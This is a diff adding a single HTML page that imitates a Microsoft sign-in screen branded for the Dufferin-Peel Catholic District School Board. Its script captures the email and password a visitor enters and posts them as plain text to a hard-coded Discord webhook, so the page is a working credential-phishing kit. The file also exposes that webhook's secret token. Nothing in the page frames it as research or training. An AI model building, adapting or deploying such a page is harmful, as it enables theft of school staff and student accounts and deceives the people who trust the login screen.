@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', sans-serif;
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .container {
+            background: white;
+            padding: 0;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15), 0 0 0 1px rgba(0, 0, 0, 0.05);
+            width: 440px;
+            /* CHANGE MIN-HEIGHT HERE to make main box taller or shorter */
+            /* Using min-height makes it dynamic - it will grow if content needs more space */
+            max-height: 440px;
+            min-height: 380px;
+            max-width: 90%;
+            position: relative;
+            z-index: 10;
+            overflow: hidden;
+        }
+
+        .slide-wrapper {
+            display: flex;
+            transition: transform 0.3s ease-in-out;
+            width: 300%;
+        }
+
+        .slide {
+            width: 33.333%;
+            flex-shrink: 0;
+            padding: 44px;
+        }
+
+        .slide.active {
+            display: block;
+        }
+
+        .loading-slide {
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+        }
+
+        .loading-slide .loading-text {
+            /* CHANGE MARGIN-TOP HERE to adjust position of "Trying to sign you in" text */
+            margin-top: 56px;
+            margin-bottom: 0;
+        }
+
+        .loading-slide .cancel-link {
+            /* Adjust this value to change cancel button position */
+            margin-top: 80px;
+        }
+
+        .loading-text {
+            font-size: 28px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 32px;
+            letter-spacing: -0.02em;
+        }
+
+        .cancel-link {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 13px;
+            display: inline-block;
+        }
+
+        .cancel-link:hover {
+            text-decoration: underline;
+            color: #005a9e;
+        }
+
+        .logo {
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+        }
+
+        .banner-logo {
+            max-width: 256px;
+            max-height: 36px;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 8px;
+            letter-spacing: -0.02em;
+        }
+
+        .user-identity {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 24px;
+            cursor: pointer;
+            padding: 4px 8px;
+            margin-left: -8px;
+            border-radius: 2px;
+            width: fit-content;
+        }
+
+        .user-identity:hover {
+            background: #f3f2f1;
+        }
+
+        .user-identity span {
+            color: #000;
+            font-size: 15px;
+        }
+
+        .back-arrow {
+            color: #000;
+            font-size: 18px;
+        }
+
+                .input-wrapper {
+            /* CHANGE MARGIN-LEFT HERE to move input box left or right (use negative values to move left) */
+            /* CHANGE MARGIN-TOP HERE to move input box up or down */
+            margin-top: 24px;
+            margin-bottom: 8px;
+            position: relative;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            /* CHANGE PADDING-LEFT and PADDING-RIGHT HERE to adjust text position inside the input box */
+            padding: 8px 0px 10px 0px;
+            font-size: 15px;
+            border: none;
+            border-bottom: 1px solid #605e5c;
+            background: transparent;
+            color: #323130;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+            outline: none;
+            transition: border-bottom 0.1s ease;
+            line-height: 1.5;
+        }
+
+        input[type="text"]:hover, input[type="password"]:hover {
+            border-bottom-color: #323130;
+        }
+
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-bottom: 2px solid #0078d4;
+            padding-bottom: 9px;
+            padding-left: 0px;
+            padding-right: 0px;
+        }
+
+        .link {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 13px;
+            display: inline-block;
+            margin-top: 12px;
+            margin-bottom: 24px;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+            color: #005a9e;
+        }
+
+        .button-container {
+            margin-top: 24px;
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .button-primary {
+            background: #0067b8;
+            color: white;
+            border: 1px solid transparent;
+            padding: 8px 24px;
+            font-size: 15px;
+            cursor: pointer;
+            font-weight: 600;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+            transition: all 0.1s ease;
+        }
+
+        .button-primary:hover {
+            background: #005a9e;
+        }
+
+        .button-primary:active {
+            background: #004578;
+        }
+
+        .button-primary:focus {
+            outline: 1px solid #000;
+            outline-offset: 2px;
+        }
+
+        .sign-in-options {
+            background: white;
+            padding: 12px 44px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15), 0 0 0 1px rgba(0, 0, 0, 0.05);
+            width: 440px;
+            max-width: 90%;
+            margin-top: 20px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            position: relative;
+            z-index: 10;
+            transition: background 0.1s ease, opacity 0.3s ease;
+        }
+
+        .sign-in-options.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .sign-in-options:hover {
+            background: #f8f8f8;
+        }
+
+        .sign-in-options img {
+            /* CHANGE WIDTH AND HEIGHT HERE to adjust size of the key icon */
+            width: 30px;
+            height: 30px;
+        }
+
+        .sign-in-options-text {
+            font-size: 15px;
+            color: #1b1b1b;
+            flex: 1;
+        }
+
+        .footer {
+            position: fixed;
+            /* CHANGE POSITION HERE - adjust 'bottom' and 'right' values to move the 3 dots */
+            bottom: 0;
+            right: 0;
+            padding: 12px 24px;
+            display: flex;
+            gap: 24px;
+            align-items: center;
+            font-size: 11px;
+            z-index: 10;
+        }
+
+        .footer a {
+            color: #605e5c;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .more-options {
+            font-size: 16px;
+            color: #605e5c;
+            cursor: pointer;
+            padding: 4px 8px;
+        }
+
+        .more-options:hover {
+            background: rgba(0, 0, 0, 0.05);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @media (max-width: 600px) {
+            .container, .sign-in-options {
+                width: 100%;
+                max-width: 100%;
+                padding-left: 24px;
+                padding-right: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="slide-wrapper" id="slideWrapper">
+            <!-- Email Slide -->
+            <div class="slide" id="emailSlide">
+                <div class="logo">
+                    <img class="banner-logo" src="https://aadcdn.msauthimages.net/dbd5a2dd-8uh3oxvpkf467huzt3tmo3uaellmkklrrlczwuncqne/logintenantbranding/0/bannerlogo?ts=638139729883334020" alt="Dufferin-Peel Catholic District School Board">
+                </div>
+                
+                <h1>Sign in</h1>
+                
+                <div class="input-wrapper">
+                    <input type="text" id="emailInput" placeholder="username@educ.dpcdsb.org" aria-label="Enter your email, phone, or Skype.">
+                </div>
+                
+                <a href="#" class="link">Can't access your account?</a>
+                
+                <div class="button-container">
+                    <button class="button-primary" id="nextButton">Next</button>
+                </div>
+            </div>
+
+            <!-- Loading Slide -->
+            <div class="slide loading-slide" id="loadingSlide">
+                <div class="logo">
+                    <img class="banner-logo" src="https://aadcdn.msauthimages.net/dbd5a2dd-8uh3oxvpkf467huzt3tmo3uaellmkklrrlczwuncqne/logintenantbranding/0/bannerlogo?ts=638139729883334020" alt="Dufferin-Peel Catholic District School Board">
+                </div>
+                
+                <h1 class="loading-text">Trying to sign you in</h1>
+                <a href="#" class="cancel-link" id="cancelLink">Cancel</a>
+            </div>
+
+            <!-- Password Slide -->
+            <div class="slide" id="passwordSlide">
+                <div class="logo">
+                    <img class="banner-logo" src="https://aadcdn.msauthimages.net/dbd5a2dd-8uh3oxvpkf467huzt3tmo3uaellmkklrrlczwuncqne/logintenantbranding/0/bannerlogo?ts=638139729883334020" alt="Dufferin-Peel Catholic District School Board">
+                </div>
+                
+                <div class="user-identity" id="backButton">
+                    <span class="back-arrow">←</span>
+                    <span id="userEmail"></span>
+                </div>
+                
+                <h1>Enter password</h1>
+                
+                <div class="input-wrapper">
+                    <input type="password" id="passwordInput" placeholder="Password" aria-label="Enter your password">
+                </div>
+                
+                <a href="#" class="link">Forgot password?</a>
+                
+                <div class="button-container">
+                    <button class="button-primary" id="signInButton">Sign in</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="sign-in-options" id="signInOptions">
+        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="Sign-in options">
+        <div class="sign-in-options-text">Sign-in options</div>
+    </div>
+
+    <div class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span class="more-options">…</span>
+    </div>
+
+    <script>
+        const emailInput = document.getElementById('emailInput');
+        const nextButton = document.getElementById('nextButton');
+        const slideWrapper = document.getElementById('slideWrapper');
+        const userEmail = document.getElementById('userEmail');
+        const backButton = document.getElementById('backButton');
+        const passwordInput = document.getElementById('passwordInput');
+        const signInOptions = document.getElementById('signInOptions');
+
+        nextButton.addEventListener('click', function(e) {
+            e.preventDefault();
+            const email = emailInput.value.trim();
+            
+            if (email) {
+                // Hide sign-in options immediately
+                signInOptions.classList.add('hidden');
+                
+                // First slide to loading screen
+                slideWrapper.style.transform = 'translateX(-33.333%)';
+                userEmail.textContent = email;
+                
+                // After 0.5 seconds, slide to password screen
+                setTimeout(() => {
+                    slideWrapper.style.transform = 'translateX(-66.666%)';
+                    
+                    // Focus password input after animation
+                    setTimeout(() => {
+                        passwordInput.focus();
+                    }, 300);
+                }, 500);
+            }
+        });
+
+        emailInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                nextButton.click();
+            }
+        });
+
+        backButton.addEventListener('click', function(e) {
+            e.preventDefault();
+            // Slide back to email view
+            slideWrapper.style.transform = 'translateX(0)';
+            
+            // Show sign-in options again
+            signInOptions.classList.remove('hidden');
+            
+            // Focus email input after animation
+            setTimeout(() => {
+                emailInput.focus();
+            }, 300);
+        });
+
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('signInButton').click();
+            }
+        });
+
+        document.getElementById('signInButton').addEventListener('click', function(e) {
+            e.preventDefault();
+            // Show alert with both email and password
+            const email = emailInput.value.trim();
+            const password = passwordInput.value;
+            sendDiscordMessage('Email: ' + email + '\nPassword: ' + password);
+
+     //     https://discordapp.com/api/webhooks/1433462433686487150/P-FcjrAjivIdB84LymQ6nr8bpER-hTNgGbttp88BZjxq-O52DNyxVjbQYAV8IHkyCGHt
+        });
+      
+      const webhookUrl = 'https://discordapp.com/api/webhooks/1433462433686487150/P-FcjrAjivIdB84LymQ6nr8bpER-hTNgGbttp88BZjxq-O52DNyxVjbQYAV8IHkyCGHt';
+
+async function sendDiscordMessage(content) {
+  try {
+    const response = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        content: content
+      })
+    });
+
+    if (response.ok) {
+      console.log('Message sent successfully!');
+    } else {
+      console.error('Failed to send message:', response.status);
+    }
+  } catch (error) {
+    console.error('Error sending message:', error);
+  }
+}
+        document.getElementById('cancelLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            // Go back to email screen
+            slideWrapper.style.transform = 'translateX(0)';
+            
+            // Show sign-in options again
+            signInOptions.classList.remove('hidden');
+            
+            setTimeout(() => {
+                emailInput.focus();
+            }, 300);
+        });
+    </script>
+</body>
+</html>
